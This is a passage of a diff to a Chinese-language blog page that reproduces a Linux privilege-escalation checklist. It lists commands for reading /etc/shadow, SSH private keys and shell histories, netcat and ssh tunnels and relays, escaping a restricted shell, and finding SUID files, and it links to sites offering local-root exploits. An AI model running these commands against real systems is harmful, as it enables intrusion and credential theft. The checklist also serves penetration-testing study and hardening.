-</code></pre><h4 id="任何“问题”文件？可写字，“无人”文件"><a href="#任何“问题”文件？可写字，“无人”文件" class="headerlink" title="任何“问题”文件？可写字，“无人”文件"></a>任何“问题”文件？可写字，“无人”文件</h4><pre><code>find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print   # world-writeable files find /dir -xdev \( -nouser -o -nogroup \) -print   # Noowner files
-
-</code></pre><h2 id="准备和寻找利用代码"><a href="#准备和寻找利用代码" class="headerlink" title="准备和寻找利用代码"></a>准备和寻找利用代码</h2><h4 id="安装-支持哪些开发工具-语言？"><a href="#安装-支持哪些开发工具-语言？" class="headerlink" title="安装/支持哪些开发工具/语言？"></a>安装/支持哪些开发工具/语言？</h4><pre><code>find / -name perl* 
-find / -name python*  
-find / -name gcc* 
-find / -name cc
-
-</code></pre><h4 id="如何上传文件？"><a href="#如何上传文件？" class="headerlink" title="如何上传文件？"></a>如何上传文件？</h4><pre><code>find / -name 
-wget 
-find / -name nc* 
-find / -name netcat* 
-find / -name tftp* 
-find / -name ftp
-
-</code></pre><h4 id="查找漏洞利用代码"><a href="#查找漏洞利用代码" class="headerlink" title="查找漏洞利用代码"></a>查找漏洞利用代码</h4><p><a href="http://www.exploit-db.com/" target="_blank" rel="noopener">http://www.exploit-db.com</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FPipe.exe -l 80 -r 80 -s 80 192.168.1.7</span><br></pre></td></tr></table></figure>
+<p>注意：ssh - [L / R] [本地端口]：[远程ip]：[远程端口] [本地用户] @ [本地ip]</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh -L 8080:127.0.0.1:80 root@192.168.1.7    # Local Port </span><br><span class="line">ssh -R 8080:127.0.0.1:80 root@192.168.1.7    # Remote Port</span><br></pre></td></tr></table></figure>
+<p>注意：mknod backpipe p; nc -l -p [远程端口] <backpipe |="" nc="" [本地ip]="" [本地端口]="">反向管道</backpipe></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mknod backpipe p ; nc -l -p 8080 &lt; backpipe | nc 10.5.5.151 80 &gt;backpipe    # Port Relay mknod backpipe p ; nc -l -p 8080 0 &amp; &lt; backpipe | tee -a inflow | nc localhost 80 | tee -a outflow 1&gt;backpipe    # Proxy (Port 80 to 8080) </span><br><span class="line">mknod backpipe p ; nc -l -p 8080 0 &amp; &lt; backpipe | tee -a inflow | nc localhost 80 | tee -a outflow &amp; 1&gt;backpipe    # Proxy monitor (Port 80 to 8080)</span><br></pre></td></tr></table></figure>
+<h4 id="隧道可能吗？远程本地发送命令"><a href="#隧道可能吗？远程本地发送命令" class="headerlink" title="隧道可能吗？远程本地发送命令"></a>隧道可能吗？远程本地发送命令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh -D 127.0.0.1:9050 -N [username]@[ip] </span><br><span class="line">proxychains ifconfig</span><br></pre></td></tr></table></figure>
+<h2 id="机密信息和用户"><a href="#机密信息和用户" class="headerlink" title="机密信息和用户"></a>机密信息和用户</h2><h4 id="你是谁？谁登录？谁已登录？那里还有谁？谁能做什么？"><a href="#你是谁？谁登录？谁已登录？那里还有谁？谁能做什么？" class="headerlink" title="你是谁？谁登录？谁已登录？那里还有谁？谁能做什么？"></a>你是谁？谁登录？谁已登录？那里还有谁？谁能做什么？</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">id </span><br><span class="line">who </span><br><span class="line">w </span><br><span class="line">last </span><br><span class="line">cat /etc/passwd | cut -d: -f1    # List of users </span><br><span class="line">grep -v -E &quot;^#&quot; /etc/passwd | awk -F: &apos;$3 == 0 &#123; print $1&#125;&apos;   # List of super users </span><br><span class="line">awk -F: &apos;($3 == &quot;0&quot;) &#123;print&#125;&apos; </span><br><span class="line">/etc/passwd   # List of super users cat /etc/sudoers </span><br><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
+<h4 id="可以找到哪些敏感文件？"><a href="#可以找到哪些敏感文件？" class="headerlink" title="可以找到哪些敏感文件？"></a>可以找到哪些敏感文件？</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/passwd </span><br><span class="line">cat /etc/group </span><br><span class="line">cat /etc/shadow </span><br><span class="line">ls -alh /var/mail/</span><br></pre></td></tr></table></figure>
+<h4 id="家庭导演中有什么“有趣”的东西？如果可以访问"><a href="#家庭导演中有什么“有趣”的东西？如果可以访问" class="headerlink" title="家庭导演中有什么“有趣”的东西？如果可以访问"></a>家庭导演中有什么“有趣”的东西？如果可以访问</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls -ahlR /root/ </span><br><span class="line">ls -ahlR /home/</span><br></pre></td></tr></table></figure>
+<h4 id="是否有密码-脚本，数据库，配置文件或日志文件？密码的默认路径和位置"><a href="#是否有密码-脚本，数据库，配置文件或日志文件？密码的默认路径和位置" class="headerlink" title="是否有密码; 脚本，数据库，配置文件或日志文件？密码的默认路径和位置"></a>是否有密码; 脚本，数据库，配置文件或日志文件？密码的默认路径和位置</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat /var/apache2/config.inc </span><br><span class="line">cat /var/lib/mysql/mysql/user.MYD </span><br><span class="line">cat /root/anaconda-ks.cfg</span><br></pre></td></tr></table></figure>
+<h4 id="用户正在做什么？是否有明文密码？他们在编辑什么？"><a href="#用户正在做什么？是否有明文密码？他们在编辑什么？" class="headerlink" title="用户正在做什么？是否有明文密码？他们在编辑什么？"></a>用户正在做什么？是否有明文密码？他们在编辑什么？</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cat ~/.bash_history </span><br><span class="line">cat ~/.nano_history </span><br><span class="line">cat ~/.atftp_history </span><br><span class="line">cat ~/.mysql_history </span><br><span class="line">cat ~/.php_history</span><br></pre></td></tr></table></figure>
+<h4 id="可以找到哪些用户信息？"><a href="#可以找到哪些用户信息？" class="headerlink" title="可以找到哪些用户信息？"></a>可以找到哪些用户信息？</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cat ~/.bashrc </span><br><span class="line">cat ~/.profile </span><br><span class="line">cat /var/mail/root </span><br><span class="line">cat /var/spool/mail/root</span><br></pre></td></tr></table></figure>
+<h4 id="可以找到私钥信息吗？"><a href="#可以找到私钥信息吗？" class="headerlink" title="可以找到私钥信息吗？"></a>可以找到私钥信息吗？</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">cat ~/.ssh/authorized_keys </span><br><span class="line">cat ~/.ssh/identity.pub </span><br><span class="line">cat ~/.ssh/identity </span><br><span class="line">cat ~/.ssh/id_rsa.pub </span><br><span class="line">cat ~/.ssh/id_rsa </span><br><span class="line">cat ~/.ssh/id_dsa.pub </span><br><span class="line">cat ~/.ssh/id_dsa </span><br><span class="line">cat /etc/ssh/ssh_config </span><br><span class="line">cat /etc/ssh/sshd_config </span><br><span class="line">cat /etc/ssh/ssh_host_dsa_key.pub </span><br><span class="line">cat /etc/ssh/ssh_host_dsa_key </span><br><span class="line">cat /etc/ssh/ssh_host_rsa_key.pub </span><br><span class="line">cat /etc/ssh/ssh_host_rsa_key </span><br><span class="line">cat /etc/ssh/ssh_host_key.pub </span><br><span class="line">cat /etc/ssh/ssh_host_key `</span><br></pre></td></tr></table></figure>
+<h2 id="文件系统"><a href="#文件系统" class="headerlink" title="文件系统"></a>文件系统</h2><h4 id="哪些配置文件可以写在-etc-中？能够重新配置服务吗？"><a href="#哪些配置文件可以写在-etc-中？能够重新配置服务吗？" class="headerlink" title="哪些配置文件可以写在/ etc /中？能够重新配置服务吗？"></a>哪些配置文件可以写在/ etc /中？<em>能够重新配置服务吗？</em></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ls -aRl /etc/ | awk &apos;$1 ~ /^.*w.*/&apos; 2&gt;/dev/null     # Anyone </span><br><span class="line">ls -aRl /etc/ | awk &apos;$1 ~ /^..w/&apos; 2&gt;/dev/null       # Owner </span><br><span class="line">ls -aRl /etc/ | awk &apos;$1 ~ /^.....w/&apos; 2&gt;/dev/null    # Group </span><br><span class="line">ls -aRl /etc/ | awk &apos;$1 ~ /w.$/&apos; 2&gt;/dev/null        # Other  </span><br><span class="line">find /etc/ -readable -type f 2&gt;/dev/null               # Anyone </span><br><span class="line">find /etc/ -readable -type f -maxdepth 1 2&gt;/dev/null   # Anyone `</span><br></pre></td></tr></table></figure>
+<h4 id="在-var-中可以找到什么？"><a href="#在-var-中可以找到什么？" class="headerlink" title="在/ var /中可以找到什么？"></a>在/ var /中可以找到什么？</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ls -alh /var/log </span><br><span class="line">ls -alh /var/mail </span><br><span class="line">ls -alh /var/spool </span><br><span class="line">ls -alh /var/spool/lpd </span><br><span class="line">ls -alh /var/lib/pgsql </span><br><span class="line">ls -alh /var/lib/mysql </span><br><span class="line">cat /var/lib/dhcp3/dhclient.leases</span><br></pre></td></tr></table></figure>
+<h4 id="网站上的任何设置-文件（隐藏）？有数据库信息的任何设置文件？"><a href="#网站上的任何设置-文件（隐藏）？有数据库信息的任何设置文件？" class="headerlink" title="网站上的任何设置/文件（隐藏）？有数据库信息的任何设置文件？"></a>网站上的任何设置/文件（隐藏）？<em>有数据库信息的任何设置文件？</em></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ls -alhR /var/www/ </span><br><span class="line">ls -alhR /srv/www/htdocs/ </span><br><span class="line">ls -alhR /usr/local/www/apache22/data/ </span><br><span class="line">ls -alhR /opt/lampp/htdocs/ </span><br><span class="line">ls -alhR /var/www/html/</span><br></pre></td></tr></table></figure>
+<p>日志文件中是否有任何内容（可以帮助“本地文件包含”！）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/httpd/logs/access_log </span><br><span class="line">cat /etc/httpd/logs/access.log </span><br><span class="line">cat /etc/httpd/logs/error_log </span><br><span class="line">cat /etc/httpd/logs/error.log </span><br><span class="line">cat /var/log/apache2/access_log </span><br><span class="line">cat /var/log/apache2/access.log </span><br><span class="line">cat /var/log/apache2/error_log </span><br><span class="line">cat /var/log/apache2/error.log </span><br><span class="line">cat /var/log/apache/access_log </span><br><span class="line">cat /var/log/apache/access.log </span><br><span class="line">cat /var/log/auth.log </span><br><span class="line">cat /var/log/chttp.log </span><br><span class="line">cat /var/log/cups/error_log </span><br><span class="line">cat /var/log/dpkg.log </span><br><span class="line">cat /var/log/faillog </span><br><span class="line">cat /var/log/httpd/access_log </span><br><span class="line">cat /var/log/httpd/access.log </span><br><span class="line">cat /var/log/httpd/error_log </span><br><span class="line">cat /var/log/httpd/error.log </span><br><span class="line">cat /var/log/lastlog </span><br><span class="line">cat /var/log/lighttpd/access.log </span><br><span class="line">cat /var/log/lighttpd/error.log </span><br><span class="line">cat /var/log/lighttpd/lighttpd.access.log </span><br><span class="line">cat /var/log/lighttpd/lighttpd.error.log </span><br><span class="line">cat /var/log/messages </span><br><span class="line">cat /var/log/secure </span><br><span class="line">cat /var/log/syslog </span><br><span class="line">cat /var/log/wtmp </span><br><span class="line">cat /var/log/xferlog </span><br><span class="line">cat /var/log/yum.log </span><br><span class="line">cat /var/run/utmp </span><br><span class="line">cat /var/webmin/miniserv.log </span><br><span class="line">cat /var/www/logs/access_log </span><br><span class="line">cat /var/www/logs/access.log </span><br><span class="line">ls -alh /var/lib/dhcp3/ </span><br><span class="line">ls -alh /var/log/postgresql/ </span><br><span class="line">ls -alh /var/log/proftpd/ </span><br><span class="line">ls -alh /var/log/samba/  </span><br><span class="line">Note: auth.log, boot, btmp, daemon.log, debug, dmesg, kern.log, mail.info, mail.log, mail.warn, messages, syslog, udev, wtmp `</span><br></pre></td></tr></table></figure>
+<p>注：http：//<a href="http://www.thegeekstuff.com/2011/08/linux-var-log-files/" target="_blank" rel="noopener">www.thegeekstuff.com/2011/08/linux-var-log-files/</a></p>
+<h4 id="如果命令有限，你会打破“监狱”外壳？"><a href="#如果命令有限，你会打破“监狱”外壳？" class="headerlink" title="如果命令有限，你会打破“监狱”外壳？"></a>如果命令有限，你会打破“监狱”外壳？</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &apos;import pty;pty.spawn(&quot;/bin/bash&quot;)&apos; echo os.system(&apos;/bin/bash&apos;) /bin/sh -i</span><br></pre></td></tr></table></figure>
+<h4 id="如何安装文件系统？"><a href="#如何安装文件系统？" class="headerlink" title="如何安装文件系统？"></a>如何安装文件系统？</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mount df -h</span><br></pre></td></tr></table></figure>
+<h4 id="是否有任何未安装的文件系统？"><a href="#是否有任何未安装的文件系统？" class="headerlink" title="是否有任何未安装的文件系统？"></a>是否有任何未安装的文件系统？</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/fstab</span><br></pre></td></tr></table></figure>
+<h4 id="使用了什么“高级Linux文件权限”？"><a href="#使用了什么“高级Linux文件权限”？" class="headerlink" title="使用了什么“高级Linux文件权限”？"></a>使用了什么“高级Linux文件权限”？</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -1000 -type d 2&gt;/dev/null   # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here.</span><br><span class="line">find / -perm -g=s -type f 2&gt;/dev/null    # SGID (chmod 2000) - run as the group, not the user who started it.</span><br><span class="line">find / -perm -u=s -type f 2&gt;/dev/null    # SUID (chmod 4000) - run as the owner, not the user who started it.</span><br><span class="line"></span><br><span class="line">find / -perm -g=s -o -perm -u=s -type f 2&gt;/dev/null    # SGID or SUID</span><br><span class="line">for i in `locate -r &quot;bin$&quot;`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2&gt;/dev/null; done    # Looks in &apos;common&apos; places: /bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /usr/local/sbin and any other *bin, for SGID or SUID (Quicker search)</span><br><span class="line"></span><br><span class="line"># find starting at root (/), SGID or SUID, not Symbolic links, only 3 folders deep, list with more detail and hide any errors (e.g. permission denied)</span><br><span class="line">find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld &#123;&#125; \; 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+<h4 id="哪里可以写入和执行？一些常见的地方：-tmp，-var-tmp，-dev-shm"><a href="#哪里可以写入和执行？一些常见的地方：-tmp，-var-tmp，-dev-shm" class="headerlink" title="哪里可以写入和执行？一些常见的地方：/ tmp，/ var / tmp，/ dev / shm"></a>哪里可以写入和执行？一些常见的地方：/ tmp，/ var / tmp，/ dev / shm</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">find / -writable -type d 2&gt;/dev/null      # world-writeable folders </span><br><span class="line">find / -perm -222 -type d 2&gt;/dev/null     # world-writeable folders </span><br><span class="line">find / -perm -o w -type d 2&gt;/dev/null     # world-writeable folders  </span><br><span class="line">find / -perm -o x -type d 2&gt;/dev/null     # world-executable folders  </span><br><span class="line">find / \( -perm -o w -perm -o x \) -type d 2&gt;/dev/null   # world-writeable &amp; executable folders</span><br></pre></td></tr></table></figure>
+<h4 id="任何“问题”文件？可写字，“无人”文件"><a href="#任何“问题”文件？可写字，“无人”文件" class="headerlink" title="任何“问题”文件？可写字，“无人”文件"></a>任何“问题”文件？可写字，“无人”文件</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print   # world-writeable files find /dir -xdev \( -nouser -o -nogroup \) -print   # Noowner files</span><br></pre></td></tr></table></figure>
+<h2 id="准备和寻找利用代码"><a href="#准备和寻找利用代码" class="headerlink" title="准备和寻找利用代码"></a>准备和寻找利用代码</h2><h4 id="安装-支持哪些开发工具-语言？"><a href="#安装-支持哪些开发工具-语言？" class="headerlink" title="安装/支持哪些开发工具/语言？"></a>安装/支持哪些开发工具/语言？</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">find / -name perl* </span><br><span class="line">find / -name python*  </span><br><span class="line">find / -name gcc* </span><br><span class="line">find / -name cc</span><br></pre></td></tr></table></figure>
+<h4 id="如何上传文件？"><a href="#如何上传文件？" class="headerlink" title="如何上传文件？"></a>如何上传文件？</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">find / -name </span><br><span class="line">wget </span><br><span class="line">find / -name nc* </span><br><span class="line">find / -name netcat* </span><br><span class="line">find / -name tftp* </span><br><span class="line">find / -name ftp</span><br></pre></td></tr></table></figure>
+<h4 id="查找漏洞利用代码"><a href="#查找漏洞利用代码" class="headerlink" title="查找漏洞利用代码"></a>查找漏洞利用代码</h4><p><a href="http://www.exploit-db.com/" target="_blank" rel="noopener">http://www.exploit-db.com</a></p>
 <p><a href="http://1337day.com/" target="_blank" rel="noopener">http://1337day.com</a></p>
 <p><a href="http://www.securiteam.com/" target="_blank" rel="noopener">http://www.securiteam.com</a></p>
 <p><a href="http://www.securityfocus.com/" target="_blank" rel="noopener">http://www.securityfocus.com</a></p>
@@ -380,17 +180,13 @@ find / -name ftp
 <p><a href="http://seclists.org/fulldisclosure/" target="_blank" rel="noopener">http://seclists.org/fulldisclosure/</a></p>
 <p><a href="http://www.google.com/" target="_blank" rel="noopener">http://www.google.com</a></p>
 <h4 id="查找有关该漏洞利用的更多信息"><a href="#查找有关该漏洞利用的更多信息" class="headerlink" title="查找有关该漏洞利用的更多信息"></a>查找有关该漏洞利用的更多信息</h4><p><a href="http://www.cvedetails.com/" target="_blank" rel="noopener">http://www.cvedetails.com</a></p>
-<pre><code>http://packetstormsecurity.org/files/cve/[CVE]
-http://cve.mitre.org/cgi-bin/cvename.cgi?name=[CVE]
-http://www.vulnview.com/cve-details.php?cvename=[CVE]
-
-</code></pre><h4 id="（快速）“常见”漏洞。警告。预编译的二进制文件。使用风险由您自己承担"><a href="#（快速）“常见”漏洞。警告。预编译的二进制文件。使用风险由您自己承担" class="headerlink" title="（快速）“常见”漏洞。警告。预编译的二进制文件。使用风险由您自己承担"></a>（快速）“常见”漏洞。警告。预编译的二进制文件。使用风险由您自己承担</h4><p><a href="http://web.archive.org/web/20111118031158/http://tarantula.by.ru/localroot/" target="_blank" rel="noopener">http://web.archive.org/web/20111118031158/http://tarantula.by.ru/localroot/</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://packetstormsecurity.org/files/cve/[CVE]</span><br><span class="line">http://cve.mitre.org/cgi-bin/cvename.cgi?name=[CVE]</span><br><span class="line">http://www.vulnview.com/cve-details.php?cvename=[CVE]</span><br></pre></td></tr></table></figure>
+<h4 id="（快速）“常见”漏洞。警告。预编译的二进制文件。使用风险由您自己承担"><a href="#（快速）“常见”漏洞。警告。预编译的二进制文件。使用风险由您自己承担" class="headerlink" title="（快速）“常见”漏洞。警告。预编译的二进制文件。使用风险由您自己承担"></a>（快速）“常见”漏洞。警告。预编译的二进制文件。使用风险由您自己承担</h4><p><a href="http://web.archive.org/web/20111118031158/http://tarantula.by.ru/localroot/" target="_blank" rel="noopener">http://web.archive.org/web/20111118031158/http://tarantula.by.ru/localroot/</a></p>
 <p><a href="http://www.kecepatan.66ghz.com/file/local-root-exploit-priv9/" target="_blank" rel="noopener">http://www.kecepatan.66ghz.com/file/local-root-exploit-priv9/</a></p>
 <h2 id="缓解措施"><a href="#缓解措施" class="headerlink" title="缓解措施"></a>缓解措施</h2><h4 id="上述任何信息都很容易找到吗？"><a href="#上述任何信息都很容易找到吗？" class="headerlink" title="上述任何信息都很容易找到吗？"></a>上述任何信息都很容易找到吗？</h4><p>试试吧！设置一个自动执行脚本和/或第三方产品的cron作业</p>
 <h4 id="系统是否完全打补丁？"><a href="#系统是否完全打补丁？" class="headerlink" title="系统是否完全打补丁？"></a>系统是否完全打补丁？</h4><p>内核，操作系统，所有应用程序，插件和Web服务</p>
-<pre><code>apt-get update &amp;&amp; apt-get upgrade yum update
-
-</code></pre><h4 id="服务是否以最低权限级别运行？"><a href="#服务是否以最低权限级别运行？" class="headerlink" title="服务是否以最低权限级别运行？"></a>服务是否以最低权限级别运行？</h4><p>例如，您是否需要以root身份运行MySQL？</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get update &amp;&amp; apt-get upgrade yum update</span><br></pre></td></tr></table></figure>
+<h4 id="服务是否以最低权限级别运行？"><a href="#服务是否以最低权限级别运行？" class="headerlink" title="服务是否以最低权限级别运行？"></a>服务是否以最低权限级别运行？</h4><p>例如，您是否需要以root身份运行MySQL？</p>
 <h4 id="脚本任何一个都可以自动化吗？！"><a href="#脚本任何一个都可以自动化吗？！" class="headerlink" title="脚本任何一个都可以自动化吗？！"></a>脚本任何一个都可以自动化吗？！</h4><p><a href="http://pentestmonkey.net/tools/unix-privesc-check/" target="_blank" rel="noopener">http://pentestmonkey.net/tools/unix-privesc-check/</a></p>
 <p><a href="http://labs.portcullis.co.uk/application/enum4linux/" target="_blank" rel="noopener">http://labs.portcullis.co.uk/application/enum4linux/</a></p>
 <p><a href="http://bastille-linux.sourceforge.net/" target="_blank" rel="noopener">http://bastille-linux.sourceforge.net</a></p>
